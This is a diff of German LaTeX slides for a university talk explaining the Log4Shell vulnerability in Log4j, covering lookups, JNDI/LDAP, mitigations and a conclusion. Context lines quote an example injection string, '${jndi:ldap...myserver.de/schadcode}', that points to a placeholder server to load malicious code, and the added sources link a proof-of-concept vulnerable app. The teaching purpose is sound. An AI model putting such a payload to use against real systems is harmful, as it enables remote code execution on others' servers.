@@ -91,9 +91,9 @@ $\Rightarrow$ Remote Code Exection, Reverse Shell etc.
 
 \end{frame}
 
-\section{Funktionsweiße}
+\section{Funktionsweise}
 \subsection{Log4J}
-\begin{frame}{Funktionsweiße}
+\begin{frame}{Funktionsweise}
 \begin{itemize}
  \item Große Anzahl an Konfigurationsmöglichkeiten\\
 $\Rightarrow$ log4j.xml
@@ -105,7 +105,7 @@ $\Rightarrow$ log4j.xml
 \end{frame}
 \begin{frame}
  \begin{block}{Lookups}
-  Bietet die Möglichkeit Umgebungsvariablen auszulesen.\\
+  Bieten die Möglichkeit Umgebungsvariablen auszulesen\\
   - zB. Datum, Betriebssystem, Verzeichniss etc.
  \end{block}
  \begin{center}
@@ -159,8 +159,8 @@ $\Rightarrow$ \textbf{\$\{jndi:ldap//:myserver.de/schadcode\}}
 
 
 \end{frame}
-
-\begin{frame}{Log4Shell Funktionsweiße}
+\subsection{Funktionsweise Log4Shell}
+\begin{frame}{Log4Shell Funktionsweise}
 \begin{center}
 \includegraphics[scale=0.35]{log4s.png}\footnote{draw.io}
 \end{center}
@@ -176,10 +176,11 @@ $\Rightarrow$ \textbf{\$\{jndi:ldap//:myserver.de/schadcode\}}
  \end{itemize}
 
 \end{frame}
-
+\section{Proof of Concept}
 \begin{frame}{Praktische Vorstellung}
  
 \end{frame}
+\section{Lösungsansätze}
 \begin{frame}{Lösungsansätze}
 \begin{itemize}
  \item Log4J Updaten auf 2.1.6
@@ -197,17 +198,21 @@ $\Rightarrow$ \textbf{\$\{jndi:ldap//:myserver.de/schadcode\}}
 \includegraphics[scale=0.35]{firewall.png}\footnote{draw.io}
 \end{center}
 \end{frame}
-
+\section{Fazit und Ausblick}
 \begin{frame}{Fazit und Ausblick}
  \begin{itemize}
   \item Größte Sicherheitslücke der letzten 10 Jahre
   \item Ausmaße noch nicht bekannt
-  \item Möglich nur durch zusammenspiel vieler einzelner Komponenten\\
+  \item Möglich nur durch Zusammenspiel vieler einzelner Komponenten\\
+  $\Rightarrow$ JAVA $\rightarrow$ LOG4J $\rightarrow$ LOOKUPS $\rightarrow$ JNDI $\rightarrow$ LDAP\\
   - Tech-Stack zu groß?\\
-  - Overengineering?
-  \item  Anwendungen werden zu komplex\\
+  - Over-Engineering?
+  \item  Anwendungen werden zu Komplex
   
  \end{itemize}
+ \begin{center}
+   logger.info("Vielen Dank für Ihre Aufmerksamkeit")
+ \end{center}
 
 \end{frame}
 \begin{frame}{Quellen}
@@ -216,7 +221,8 @@ $\Rightarrow$ \textbf{\$\{jndi:ldap//:myserver.de/schadcode\}}
 3 | apache.org, 18.02.2022, https://aries.apache.org/documentation/modules/jndiproject.html\\
 4 | wikipedia.org, 12.01.2022, https://en.wikipedia.org/wiki/Lightweight\_Directory\_Access\_Protocol\\
 5-6 | draw.io, 20.02.2022, https://draw.io\\ 
-- Vorlesungsfolien Netzwerk und Systemsicherheit, Prof. Dr. Christian Henrich, Wintersemester 2021/22
+Vorlesungsfolien Netzwerk und Systemsicherheit, Prof. Dr. Christian Henrich, Wintersemester 2021/22\\
+Proof of concept | https://github.com/christophetd/log4shell-vulnerable-app
 \end{frame}
 
 
